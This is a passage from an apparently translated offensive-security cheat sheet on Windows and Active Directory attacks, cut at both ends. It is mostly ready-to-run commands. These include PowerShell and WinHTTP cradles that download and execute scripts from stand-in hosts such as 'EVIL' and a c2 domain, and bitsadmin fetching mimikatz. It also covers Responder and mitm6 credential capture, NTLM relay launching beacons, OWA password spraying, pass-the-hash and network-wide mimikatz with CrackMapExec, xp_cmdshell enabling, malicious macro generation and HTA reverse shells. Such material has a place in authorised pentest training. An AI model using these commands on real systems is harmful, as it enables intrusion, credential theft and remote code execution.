wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cscript wget.vbs &lt;url&gt; &lt;out_file&gt;</span><br><span class="line"></span><br><span class="line">Use echoup function on pentest.ws to generate echo commands.</span><br><span class="line">https://pentest.ws/features</span><br></pre></td></tr></table></figure><h2 id="2-4-Powershell"><a href="#2-4-Powershell" class="headerlink" title="2.4 Powershell"></a>2.4 Powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles</span><br><span class="line"></span><br><span class="line">Invoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;</span><br><span class="line"></span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) </span><br><span class="line"></span><br><span class="line">#Powershell Download to Memory</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).downloadString(&apos;http://server/script.ps1&apos;)</span><br><span class="line"></span><br><span class="line">#Powershell with Proxy</span><br><span class="line"></span><br><span class="line">$browser = New-Object System.Net.WebClient;</span><br><span class="line">$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;</span><br><span class="line">IEX($browser.DownloadString(&apos;https://server/script.ps1&apos;));</span><br></pre></td></tr></table></figure><h2 id="2-5-Powershell-Base64"><a href="#2-5-Powershell-Base64" class="headerlink" title="2.5 Powershell Base64"></a>2.5 Powershell Base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fileName = &quot;Passwords.kdbx&quot;</span><br><span class="line">$fileContent = get-content $fileName</span><br><span class="line">$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)</span><br><span class="line">$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)</span><br><span class="line">$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)</span><br></pre></td></tr></table></figure><h2 id="2-6-安全复制-pscp-exe"><a href="#2-6-安全复制-pscp-exe" class="headerlink" title="2.6 安全复制/ pscp.exe"></a>2.6 安全复制/ pscp.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt</span><br><span class="line">pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt</span><br></pre></td></tr></table></figure><h2 id="2-7-BitsAdmin-exe"><a href="#2-7-BitsAdmin-exe" class="headerlink" title="2.7 BitsAdmin.exe"></a>2.7 BitsAdmin.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="2-8-Remote-Desktop"><a href="#2-8-Remote-Desktop" class="headerlink" title="2.8 Remote Desktop"></a>2.8 Remote Desktop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.10.10.10 -r disk:linux=&apos;/home/user/filetransferout&apos;</span><br></pre></td></tr></table></figure><h2 id="2-9-WinHTTP-Com-Object"><a href="#2-9-WinHTTP-Com-Object" class="headerlink" title="2.9 WinHTTP Com Object"></a>2.9 WinHTTP Com Object</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[System.Net.WebRequest]::DefaultWebProxy</span><br><span class="line">[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&apos;GET&apos;,&apos;http://EVIL/evil.ps1&apos;,$false);$h.send();iex $h.responseText</span><br></pre></td></tr></table></figure><h2 id="2-10-CertUtil"><a href="#2-10-CertUtil" class="headerlink" title="2.10 CertUtil"></a>2.10 CertUtil</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#File Transfer</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename</span><br><span class="line"></span><br><span class="line">#CertUtil Base64 Transfers</span><br><span class="line"></span><br><span class="line">certutil.exe -encode inputFileName encodedOutputFileName</span><br><span class="line">certutil.exe -decode encodedInputFileName decodedOutputFileName</span><br></pre></td></tr></table></figure><h2 id="2-11-Curl-Windows-1803"><a href="#2-11-Curl-Windows-1803" class="headerlink" title="2.11 Curl (Windows 1803+)"></a>2.11 Curl (Windows 1803+)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://server/file -o file</span><br><span class="line">curl http://server/file.bat | cmd</span><br><span class="line"></span><br><span class="line">IEX(curl http://server/script.ps1);Invoke-Blah</span><br></pre></td></tr></table></figure><h2 id="2-12-SMB"><a href="#2-12-SMB" class="headerlink" title="2.12 SMB"></a>2.12 SMB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support</span><br></pre></td></tr></table></figure><h1 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h1><h2 id="3-1-LLMNR-NBT-NS欺骗"><a href="#3-1-LLMNR-NBT-NS欺骗" class="headerlink" title="3.1 LLMNR / NBT-NS欺骗"></a>3.1 LLMNR / NBT-NS欺骗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Responder to Steal Creds</span><br><span class="line"></span><br><span class="line">git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like</span><br><span class="line"></span><br><span class="line">&apos;Yeah I&apos;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&apos;</span><br></pre></td></tr></table></figure><h2 id="3-2-Responder-WPAD-Attack"><a href="#3-2-Responder-WPAD-Attack" class="headerlink" title="3.2 Responder WPAD Attack"></a>3.2 Responder WPAD Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 wpad</span><br><span class="line"></span><br><span class="line">By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet</span><br><span class="line"></span><br><span class="line">Go to internet explorer and search for Google which automatically searches for a WPAD file... </span><br><span class="line"></span><br><span class="line">Then take NTLMv2 hash and NTLM Relay it or send to cracking rig.</span><br></pre></td></tr></table></figure><h2 id="3-3-mitm6"><a href="#3-3-mitm6" class="headerlink" title="3.3 mitm6"></a>3.3 mitm6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. </span><br><span class="line"></span><br><span class="line">By default IPV6 should be enabled. </span><br><span class="line">git clone https://github.com/fox-it/mitm6.git </span><br><span class="line">cd /opt/tools/mitm6</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line">mitm6 -d m0chanAD.local</span><br><span class="line"></span><br><span class="line">Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. </span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i</span><br><span class="line"></span><br><span class="line">-i opens an interactive shell.</span><br><span class="line"></span><br><span class="line">Shout out to hausec for this super nice tip.</span><br></pre></td></tr></table></figure><h2 id="3-4-SCF文件攻击"><a href="#3-4-SCF文件攻击" class="headerlink" title="3.4 SCF文件攻击"></a>3.4 SCF文件攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Create .scf file and drop inside SMB Share and fire up Responder ;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Filename = @m0chan.scf</span><br><span class="line"></span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.2\Share\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><h2 id="3-5-NTLM-Relay"><a href="#3-5-NTLM-Relay" class="headerlink" title="3.5 NTLM-Relay"></a>3.5 NTLM-Relay</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Good article explaining differences between NTLM/Net-NTLMV1&amp;V2</span><br><span class="line"></span><br><span class="line">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</span><br><span class="line"></span><br><span class="line">TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.</span><br><span class="line"></span><br><span class="line">You CAN perform Pass-The-Hash attacks with NTLM hashes.</span><br><span class="line">You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.</span><br><span class="line"></span><br><span class="line">PS: You CANNOT relay a hash back to itself.</span><br><span class="line">PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt</span><br><span class="line"></span><br><span class="line">This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.</span><br><span class="line"></span><br><span class="line">python Responder.py -I &lt;interface&gt; -r -d -w</span><br><span class="line">ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)</span><br><span class="line"></span><br><span class="line">How about we execute a command instead.</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd</span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP</span><br></pre></td></tr></table></figure><h2 id="3-6-私下交易"><a href="#3-6-私下交易" class="headerlink" title="3.6 私下交易"></a>3.6 私下交易</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</span><br><span class="line"></span><br><span class="line">Combine privxchange.py and ntlmrelayx</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE</span><br><span class="line"></span><br><span class="line">python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local</span><br></pre></td></tr></table></figure><h2 id="3-7-Exchange-Password-Spray"><a href="#3-7-Exchange-Password-Spray" class="headerlink" title="3.7 Exchange Password Spray"></a>3.7 Exchange Password Spray</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#https://github.com/sensepost/ruler</span><br><span class="line"></span><br><span class="line">./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v</span><br></pre></td></tr></table></figure><h2 id="3-8-ExchangeRelayX"><a href="#3-8-ExchangeRelayX" class="headerlink" title="3.8 ExchangeRelayX"></a>3.8 ExchangeRelayX</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/quickbreach/ExchangeRelayX</span><br><span class="line"></span><br><span class="line">An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./exchangeRelayx.py -t https://mail.quickbreach.com</span><br></pre></td></tr></table></figure><h2 id="3-9-Exchange-Mailbox-Post-Compromise"><a href="#3-9-Exchange-Mailbox-Post-Compromise" class="headerlink" title="3.9 Exchange Mailbox Post-Compromise"></a>3.9 Exchange Mailbox Post-Compromise</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Enumerate GlobalAddressList</span><br><span class="line"></span><br><span class="line">Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019</span><br><span class="line"></span><br><span class="line">Enumerate AD Usernames</span><br><span class="line"></span><br><span class="line">Get-ADUsernameFromEWS -Emaillist .\users.txt</span><br><span class="line"></span><br><span class="line">Enumerate Mailbox Folders</span><br><span class="line"></span><br><span class="line">Get-MailboxFolders -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials Stored in Emails</span><br><span class="line"></span><br><span class="line">Invoke-SelfSearch -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin</span><br><span class="line"></span><br><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012</span><br></pre></td></tr></table></figure><h2 id="3-10-CrackMapExec"><a href="#3-10-CrackMapExec" class="headerlink" title="3.10 CrackMapExec"></a>3.10 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CrackMapExec is installed on Kali or get Windows Binary from Github.</span><br><span class="line"></span><br><span class="line">Has 3 Execution Methods</span><br><span class="line">crackmapexec smb &lt;- Creating and Running a Service over SMB</span><br><span class="line">crackmapexec wmi &lt;- Executes command over WMI</span><br><span class="line">crackmapexec at &lt;- Schedules Task with Task Scheduler</span><br><span class="line"></span><br><span class="line">Can execute plain commands with -X flag i/e </span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 -x whoami</span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 &lt;- Host Discovery</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; </span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --pass-pol</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --shares</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can also PTH with CME</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e</span><br><span class="line"></span><br><span class="line">cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS</span><br><span class="line"></span><br><span class="line">Dump Local SAM hashes</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth --sam</span><br><span class="line"></span><br><span class="line">Running Mimikatz </span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M mimikatz</span><br><span class="line"></span><br><span class="line">^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin</span><br><span class="line"></span><br><span class="line">Enum AV Products</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M enum_avproducts</span><br></pre></td></tr></table></figure><h2 id="3-11-邮件狙击手"><a href="#3-11-邮件狙击手" class="headerlink" title="3.11 邮件狙击手"></a>3.11 邮件狙击手</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019</span><br><span class="line"></span><br><span class="line">[*] Now spraying the OWA portal at https://m0chanAD.local/owa/</span><br><span class="line"></span><br><span class="line">[*] SUCCESS! User:m0chan:Summer2019</span><br><span class="line"></span><br><span class="line">Lmao, you really think Id use the pass Summer2019?</span><br></pre></td></tr></table></figure><h2 id="3-12-Kerberos-Stuff"><a href="#3-12-Kerberos-Stuff" class="headerlink" title="3.12 Kerberos Stuff"></a>3.12 Kerberos Stuff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br></pre></td></tr></table></figure><h2 id="3-13-MSSQL利用（PowerUpSQL）"><a href="#3-13-MSSQL利用（PowerUpSQL）" class="headerlink" title="3.13 MSSQL利用（PowerUpSQL）"></a>3.13 MSSQL利用（PowerUpSQL）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/NetSPI/PowerUpSQL</span><br><span class="line"></span><br><span class="line">#View SQL Instances</span><br><span class="line">Get-SQLInstanceDomain [| Get-SQLServerInfo]</span><br><span class="line"></span><br><span class="line">#Login in with Domain Account</span><br><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line"></span><br><span class="line">#Login in with Default Password</span><br><span class="line">Get-SQLServerDefaultLoginPw</span><br><span class="line"></span><br><span class="line">#List DB, Tables &amp; Columns</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLDatabase</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;</span><br><span class="line"></span><br><span class="line">#Search Column Names for Word</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10</span><br><span class="line"></span><br><span class="line">#Try to Execute Commands (RCE)</span><br><span class="line"></span><br><span class="line">Invoke-SQLOSCmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Enable XP_CMDShell Process</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">xp_cmdshell &apos;&lt;cmd&gt;&apos;</span><br><span class="line">go</span><br></pre></td></tr></table></figure><h2 id="3-14-Malicious-Macro-with-MSBuild"><a href="#3-14-Malicious-Macro-with-MSBuild" class="headerlink" title="3.14 Malicious Macro with MSBuild"></a>3.14 Malicious Macro with MSBuild</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/infosecn1nja/MaliciousMacroMSBuild</span><br><span class="line"></span><br><span class="line">#https://lolbas-project.github.io/lolbas/Binaries/Msbuild/ - MSBuild Explained</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a PowerShell MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p powershell -i /path/payload.ps1 -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Custom MSBuild VBA Macro</span><br><span class="line">python m3-gen.py -p custom -i /path/msbuild.xml -o output.vba</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Kill Date</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -k 20/03/2018</span><br><span class="line"></span><br><span class="line">Creation of a Shellcode MSBuild VBA Macro With Environmental Keying</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain</span><br><span class="line">python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba -d yourdomain, microsoft, github</span><br></pre></td></tr></table></figure><h2 id="3-15-WeirdHTA-Undetectable-HTA"><a href="#3-15-WeirdHTA-Undetectable-HTA" class="headerlink" title="3.15 WeirdHTA - Undetectable HTA"></a>3.15 WeirdHTA - Undetectable HTA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/felamos/weirdhta</span><br><span class="line"></span><br><span class="line">python3 --help</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --normal (for normal powershell reverse_shell)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --smb (without powershell payload, it will use smb)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --powercat (for powercat)</span><br><span class="line">python3 weirdhta.py 10.10.10.10 4444 --command &apos;c:\windows\system32\cmd.exe&apos; (custom command)</span><br></pre></td></tr></table></figure><h2 id="3-16-EvilWinRM"><a href="#3-16-EvilWinRM" class="headerlink" title="3.16 EvilWinRM"></a>3.16 EvilWinRM</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/Hackplayers/evil-winrm</span><br><span class="line"></span><br><span class="line">Ultimate Shell for WinRM Connections</span><br><span class="line"></span><br><span class="line">Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ]</span><br><span class="line">    -S, --ssl                        Enable SSL</span><br><span class="line">    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate</span><br><span class="line">    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path</span><br><span class="line">    -e, --executables EXES_PATH      C# executables local path</span><br><span class="line">    -i, --ip IP                      Remote host IP or hostname (required)</span><br><span class="line">    -U, --url URL                    Remote url endpoint (default /wsman)</span><br><span class="line">    -u, --user USER                  Username (required)</span><br><span class="line">    -p, --password PASS              Password</span><br><span class="line">    -P, --port PORT                  Remote host port (default 5985)</span><br><span class="line">    -V, --version                    Show version</span><br><span class="line">    -h, --help                       Display this help message</span><br></pre></td></tr></table></figure><p>3.17 GetVulnerableGPO</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/gpoguy/GetVulnerableGPO</span><br><span class="line"></span><br><span class="line">PowerShell script to find &apos;vulnerable&apos; security-related GPOs that should be hardened (for more background, see the 